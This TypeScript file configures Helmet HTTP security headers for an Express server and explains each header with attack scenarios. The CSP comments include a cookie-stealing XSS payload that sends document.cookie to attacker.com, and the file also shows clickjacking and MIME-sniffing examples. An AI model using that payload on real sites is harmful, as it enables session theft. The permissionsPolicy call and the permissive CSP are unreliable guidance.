/**
 * HELMET.JS SECURITY HEADERS CONFIGURATION
 * 
 * ✅ Comprehensive HTTP security headers
 * ✅ X-Powered-By disabled
 * ✅ Content Security Policy configured
 * ✅ Standard security headers enabled
 * ✅ No conflicts with other middleware
 * 
 * Helmet is an Express middleware that sets various HTTP headers
 * to help secure Express apps and prevent common vulnerabilities.
 * 
 * Installation:
 * npm install helmet
 * 
 * Security headers configured:
 * - Strict-Transport-Security (HSTS)
 * - X-Frame-Options
 * - X-Content-Type-Options
 * - X-XSS-Protection
 * - Content-Security-Policy (CSP)
 * - Referrer-Policy
 * - Permissions-Policy
 * - X-Powered-By (disabled)
 */

// @ts-ignore - helmet installed in backend only
import helmet from 'helmet';
// @ts-ignore
import type { Express } from 'express';

// ============================================================
// HELMET SECURITY CONFIGURATION
// ============================================================

/**
 * Helmet provides sensible defaults for security headers.
 * This configuration enables all standard headers with customization.
 */

export function configureHelmet(app: Express): void {
  /**
   * HELMET MIDDLEWARE CHAIN
   * 
   * Order matters - apply before other middleware
   * Express will apply them in order:
   * 1. Helmet security headers
   * 2. Rate limiting
   * 3. CORS
   * 4. Body parsing
   * 5. Request logging
   * 6. Route handlers
   */

  // ──────────────────────────────────────────────────────
  // 1. STRICT-TRANSPORT-SECURITY (HSTS)
  // ──────────────────────────────────────────────────────
  // Forces browsers to use HTTPS for all future connections
  // Prevents downgrade attacks and cookie theft

  app.use(
    helmet.hsts({
      // Max age in seconds (recommended: 31536000 = 1 year)
      maxAge: 31536000,
      // Include subdomains
      includeSubDomains: true,
      // Allow preload in HSTS preload list
      preload: true,
    })
  );

  // ──────────────────────────────────────────────────────
  // 2. X-FRAME-OPTIONS (Prevent Clickjacking)
  // ──────────────────────────────────────────────────────
  // Prevents page from being embedded in frames/iframes
  // Defends against clickjacking attacks

  app.use(
    helmet.frameguard({
      action: 'deny', // Don't allow framing from any origin
      // Other options:
      // action: 'sameorigin' - Allow if same origin
      // action: 'allow-from https://example.com' - Allow specific origin
    })
  );

  // ──────────────────────────────────────────────────────
  // 3. X-CONTENT-TYPE-OPTIONS (MIME Sniffing Protection)
  // ──────────────────────────────────────────────────────
  // Prevents browsers from MIME sniffing
  // Stops malicious files (JS as text) from being executed

  app.use(helmet.noSniff());
  // Sets: X-Content-Type-Options: nosniff

  // ──────────────────────────────────────────────────────
  // 4. X-XSS-PROTECTION (Legacy XSS Protection)
  // ──────────────────────────────────────────────────────
  // Enables browser's XSS filter (if available)
  // Modern browsers: Use CSP instead
  // Legacy browsers: This provides fallback

  app.use(helmet.xssFilter());
  // Sets: X-XSS-Protection: 1; mode=block

  // ──────────────────────────────────────────────────────
  // 5. REFERRER-POLICY (Control Referrer Information)
  // ──────────────────────────────────────────────────────
  // Controls what referrer info is leaked to external sites
  // Protects user privacy

  app.use(
    helmet.referrerPolicy({
      policy: 'strict-origin-when-cross-origin',
      // Other policies:
      // 'no-referrer' - Never send referrer
      // 'same-origin' - Only send if same origin
      // 'strict-origin' - Only send origin, no path
      // 'strict-origin-when-cross-origin' - Recommended balance
    })
  );

  // ──────────────────────────────────────────────────────
  // 6. PERMISSIONS-POLICY (Control API Access)
  // ──────────────────────────────────────────────────────
  // Restricts which browser features/APIs can be used
  // Prevents malicious scripts from accessing sensitive APIs

  app.use(
    (helmet as any).permissionsPolicy({
      permissions: {
        // Camera: disable (we're an API, not a web app)
        camera: ['()'],
        // Microphone: disable
        microphone: ['()'],
        // Geolocation: allow from same origin only
        geolocation: ['(self)'],
        // Gyroscope: disable
        gyroscope: ['()'],
        // Magnetometer: disable
        magnetometer: ['()'],
        // Payment: disable
        'payment': ['()'],
        // USB: disable
        'usb': ['()'],
      },
    })
  );

  // ──────────────────────────────────────────────────────
  // 7. X-DNS-PREFETCH-CONTROL
  // ──────────────────────────────────────────────────────
  // Prevents browser from prefetching DNS for links
  // Improves privacy

  app.use(helmet.dnsPrefetchControl({ allow: false }));
  // Sets: X-DNS-Prefetch-Control: off

  // ──────────────────────────────────────────────────────
  // 8. CONTENT-SECURITY-POLICY (CSP)
  // ──────────────────────────────────────────────────────
  // Whitelist sources for scripts, styles, images, etc
  // Prevents inline code execution and resource loading
  // Most powerful XSS prevention tool available

  app.use(
    helmet.contentSecurityPolicy({
      directives: {
        // Default: applies to any directive not explicitly set
        defaultSrc: ["'self'"],

        // Scripts: Only from same origin + trusted CDNs
        scriptSrc: [
          "'self'", // Same origin
          "'unsafe-inline'", // Allow inline (necessary for Expo/React)
          "'unsafe-eval'", // Allow eval (necessary for React development)
          'https://cdn.jsdelivr.net', // CDN example
          'https://unpkg.com', // CDN example
        ],

        // Styles: Only from same origin + inline styles
        styleSrc: [
          "'self'",
          "'unsafe-inline'", // Required for styled-components, inline CSS
          'https://fonts.googleapis.com', // Google Fonts
        ],

        // Fonts: Allow Google Fonts + self
        fontSrc: [
          "'self'",
          'https://fonts.gstatic.com',
          'https://fonts.googleapis.com',
        ],

        // Images: Allow from any HTTPS source
        imgSrc: [
          "'self'",
          'data:', // Allow data: URLs for encoded images
          'https:', // Allow all HTTPS images
        ],

        // Media (audio/video): Allow from same origin + HTTPS
        mediaSrc: ["'self'", 'https:'],

        // Frame ancestors: Prevent embedding (clickjacking)
        frameAncestors: ["'none'"],

        // Form actions: Allow POST to same origin only
        formAction: ["'self'"],

        // Connect sources: API, WebSockets, etc
        connectSrc: [
          "'self'",
          'https:', // Allow all HTTPS connections (for API calls)
          'ws:', // Allow WebSockets
          'wss:', // Allow secure WebSockets
        ],

        // Objects/plugins (deprecated but included)
        objectSrc: ["'none'"],

        // Base URI: Restrict base href
        baseUri: ["'self'"],
      },

      // Report CSP violations (optional)
      // Useful for debugging CSP issues in production
      reportOnly: false, // Set true to test without blocking
    })
  );

  // ──────────────────────────────────────────────────────
  // 9. X-POWERED-BY DISABLED
  // ──────────────────────────────────────────────────────
  // By default, Express sets: X-Powered-By: Express
  // This leaks that we're using Express (information disclosure)
  // Helmet disables this by default

  // This is implicitly handled by helmet.js, but we can also do:
  app.disable('x-powered-by'); // Explicitly disable

  // ──────────────────────────────────────────────────────
  // 10. ADDITIONAL SECURITY MIDDLEWARE
  // ──────────────────────────────────────────────────────

  // Helmet also includes:
  // - Expect-CT (for certificate transparency)
  // - X-Download-Options (for IE)
  // All handled by default with helmet()
}

/**
 * Alternative: Use helmet() shorthand for all defaults
 * 
 * This enables all Helmet defaults including:
 * - Strict-Transport-Security
 * - X-Frame-Options
 * - X-Content-Type-Options
 * - X-XSS-Protection
 * - Content-Security-Policy
 * - Referrer-Policy
 * - X-Powered-By disabled
 * - And more...
 * 
 * Usage:
 * app.use(helmet());
 * 
 * This is simpler but less flexible than individual configuration.
 * We use the detailed approach to customize CSP and each header.
 */

// ============================================================
// SECURITY HEADERS EXPLAINED
// ============================================================

/**
 * STRICT-TRANSPORT-SECURITY (HSTS)
 * ═══════════════════════════════════════════════════════════
 * Header: Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
 * 
 * What it does:
 * - Tells browser to ALWAYS use HTTPS for this domain
 * - Even if user types "http://example.com"
 * - Prevents SSL downgrade attacks and cookie theft
 * 
 * Why it matters:
 * - Man-in-the-middle (MITM) attacker can downgrade HTTPS to HTTP
 * - Once downgraded, attacker can intercept cookies, credentials
 * - HSTS prevents the downgrade from working
 * 
 * Example attack (without HSTS):
 * 1. User's first request: http://example.com
 * 2. Attacker intercepts, blocks redirect to HTTPS
 * 3. MITM gets session cookie
 * 4. Attacker logs in as user
 * 
 * With HSTS:
 * 1. Browser remembers: Always use HTTPS for this domain
 * 2. http://example.com → Browser forces HTTPS automatically
 * 3. Attacker can't downgrade
 * 
 * ─────────────────────────────────────────────────────────
 * X-FRAME-OPTIONS (Clickjacking Protection)
 * ═══════════════════════════════════════════════════════════
 * Header: X-Frame-Options: deny
 * 
 * What it does:
 * - Prevents page from being embedded in <iframe>
 * - Protects against clickjacking attacks
 * 
 * Clickjacking example:
 * <iframe src="https://yourbank.com/transfer" style="opacity:0"></iframe>
 * <button>Click to win prize!</button>
 * → User clicks button, unknowingly transfers money
 * 
 * With X-Frame-Options: deny
 * - Page refuses to be framed
 * - Clickjacking attack fails
 * 
 * ─────────────────────────────────────────────────────────
 * X-CONTENT-TYPE-OPTIONS (MIME Sniffing Protection)
 * ═══════════════════════════════════════════════════════════
 * Header: X-Content-Type-Options: nosniff
 * 
 * What it does:
 * - Disables MIME sniffing
 * - Browser uses Content-Type header, not file content
 * 
 * MIME sniffing attack:
 * 1. Server serves file.txt with Content-Type: text/plain
 * 2. But file.txt actually contains: <script>alert('XSS')</script>
 * 3. Browser "sniffs" and sees JavaScript
 * 4. Browser executes as script instead of text
 * 
 * With X-Content-Type-Options: nosniff:
 * - Browser trusts Content-Type header
 * - Treats it as text, doesn't execute
 * 
 * ─────────────────────────────────────────────────────────
 * CONTENT-SECURITY-POLICY (CSP)
 * ═══════════════════════════════════════════════════════════
 * Header: Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com; ...
 * 
 * What it does:
 * - Whitelists where resources (scripts, styles, images) can come from
 * - Prevents inline code execution (mitigates XSS)
 * - Prevents loading from untrusted sources
 * 
 * XSS attack (without CSP):
 * <img src=x onerror="fetch('https://attacker.com?cookie=' + document.cookie)">
 * → JavaScript executes, cookie stolen
 * 
 * With CSP (script-src 'self' only):
 * - Inline scripts not allowed
 * - fetch() call blocked
 * - Attacker can't steal cookies
 * 
 * But CSP is complex because modern apps use:
 * - Inline <style> tags (styled-components)
 * - eval() for debugging (React development)
 * - Multiple CDNs for libraries
 * 
 * That's why we allow:
 * - script-src: 'unsafe-inline' + 'unsafe-eval' (necessary for React)
 * - scriptSrc: trusted CDNs (if using them)
 * 
 * In production with stricter CSP:
 * - Build without inline styles (extract to CSS files)
 * - Remove unsafe-eval (use source maps instead)
 * - Only whitelist necessary CDNs
 * 
 * ─────────────────────────────────────────────────────────
 * REFERRER-POLICY
 * ═══════════════════════════════════════════════════════════
 * Header: Referrer-Policy: strict-origin-when-cross-origin
 * 
 * What it does:
 * - Controls what referrer info is sent to external sites
 * 
 * Privacy concern:
 * User visits: https://securehealth.com/user/john-doe/medical-history
 * Then clicks link to: https://facebook.com
 * 
 * Without referrer policy:
 * - Facebook sees: Referer: https://securehealth.com/user/john-doe/medical-history
 * - Facebook learns user's medical condition
 * 
 * With strict-origin-when-cross-origin:
 * - Facebook sees: Referer: https://securehealth.com
 * - Knows user visited health site, but not what page
 * 
 * ─────────────────────────────────────────────────────────
 * X-POWERED-BY DISABLED
 * ═══════════════════════════════════════════════════════════
 * By default, Express sends: X-Powered-By: Express
 * 
 * Information disclosure:
 * - Attacker learns we use Express
 * - Attacker knows potential vulnerabilities to try
 * - CVEs specific to Express version
 * 
 * With X-Powered-By disabled:
 * - No information leaked
 * - Attacker has less to work with
 * 
 * Security benefit: Small, but follows least privilege principle
 */

// ============================================================
// MIDDLEWARE INTEGRATION
// ============================================================

/**
 * In server.ts, apply Helmet FIRST:
 * 
 * const app = express();
 * 
 * // 1. SECURITY HEADERS (Helmet) - FIRST
 * configureHelmet(app);
 * 
 * // 2. Trust proxy setting
 * app.set('trust proxy', 1);
 * 
 * // 3. Body parsing
 * app.use(express.json());
 * 
 * // 4. CORS
 * app.use(cors(...));
 * 
 * // 5. Rate limiting
 * app.use(globalLimiter);
 * 
 * // 6. Request logging
 * app.use(requestLogger);
 * 
 * // 7. Routes
 * app.get('/api/...', ...);
 * 
 * Order matters because:
 * - Security headers must be set on all responses
 * - Applied at response time, not request time
 * - First middleware = first to set headers
 */

// ============================================================
// CSP DEVELOPMENT VS PRODUCTION
// ============================================================

/**
 * DEVELOPMENT CSP (Current Configuration)
 * 
 * Allows:
 * - 'unsafe-inline' for scripts (React, styled-components)
 * - 'unsafe-eval' for eval (development tools)
 * - Multiple CDNs for easier integration
 * 
 * Trade-off: Less restrictive, but easier development
 * 
 * ─────────────────────────────────────────────────────────
 * PRODUCTION CSP (Recommended for Production)
 * 
 * Stricter version:
 * 
 *   scriptSrc: ["'self'"],  // No unsafe-inline, no unsafe-eval
 *   styleSrc: ["'self'"],   // No inline styles
 *   fontSrc: ["'self'"],    // Only self-hosted fonts
 *   imgSrc: ["'self'", 'https:'],
 *   connectSrc: ["'self'"], // Only same-origin API calls
 *   // Remove HTTP resources entirely
 * 
 * Requires:
 * - Bundle scripts with hashes in CSP header
 * - Extract inline styles to CSS files
 * - Use Service Worker for dynamic assets
 * - Build tool support (Webpack, Vite)
 * 
 * To test production CSP without enforcing:
 * Set reportOnly: true (logs violations instead of blocking)
 * 
 * ─────────────────────────────────────────────────────────
 * CSP VIOLATION MONITORING
 * 
 * If reportOnly: true, violations are reported (not blocked)
 * Can set report-uri to collect violations:
 * 
 *   reportUri: '/api/csp-violations'
 * 
 * Then in handler:
 * app.post('/api/csp-violations', (req, res) => {
 *   const violation = req.body['csp-report'];
 *   console.warn('CSP Violation:', violation);
 *   // Send to logging service (Sentry, etc)
 *   res.status(204).end();
 * });
 * 
 * Helps identify CSP issues before enforcing
 */

// ============================================================
// HELMET CONFLICTS & COMPATIBILITY
// ============================================================

/**
 * HELMET CONFLICTS WITH:
 * 
 * 1. Custom X-Powered-By header
 *    Problem: Helmet disables it
 *    Solution: Don't set it (Helmet's behavior is correct)
 * 
 * 2. Iframe embedding (if needed)
 *    Problem: X-Frame-Options: deny blocks all iframes
 *    Solution: Change frameguard action to 'sameorigin'
 *    Code: helmet.frameguard({ action: 'sameorigin' })
 * 
 * 3. Inline styles/scripts (if CSP too strict)
 *    Problem: CSP blocks inline code
 *    Solution: Add 'unsafe-inline' to CSP (current config does this)
 * 
 * 4. File downloads (IE legacy)
 *    Problem: X-Download-Options: noopen
 *    Solution: Most modern apps don't need this (IE deprecated)
 * 
 * NOT IN CONFLICT WITH:
 * ✅ CORS (separate headers)
 * ✅ Rate limiting (different layer)
 * ✅ Input validation (different layer)
 * ✅ Express-validator (middleware, not headers)
 * ✅ Compression (separate middleware)
 * ✅ Session management (different layer)
 * ✅ Authentication (different layer)
 * 
 * Helmet sets HTTP headers only
 * Other middleware handle request processing
 * No conflicts if applied in correct order
 */

// ============================================================
// TESTING SECURITY HEADERS
// ============================================================

/**
 * Verify headers are set:
 * 
 * curl -I http://localhost:3000/health
 * 
 * Expected response headers:
 * 
 * Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
 * X-Frame-Options: DENY
 * X-Content-Type-Options: nosniff
 * X-XSS-Protection: 1; mode=block
 * Referrer-Policy: strict-origin-when-cross-origin
 * Permissions-Policy: camera=(), microphone=(), geolocation=(self), ...
 * X-DNS-Prefetch-Control: off
 * Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline' ...
 * 
 * If you see these headers, Helmet is working correctly!
 * 
 * ─────────────────────────────────────────────────────────
 * Security header testing tools:
 * 
 * 1. Online checkers:
 *    https://securityheaders.com
 *    (Enter your URL, get score)
 * 
 * 2. Browser DevTools:
 *    - Open DevTools (F12)
 *    - Network tab
 *    - Click request
 *    - Response Headers section
 *    - Look for security headers
 * 
 * 3. curl command:
 *    curl -I https://yourdomain.com | grep -i "Security\|X-\|Content-Security"
 * 
 * 4. npm package:
 *    npm install --save-dev helmet-csp
 *    (Provides detailed CSP validation)
 */

export { };
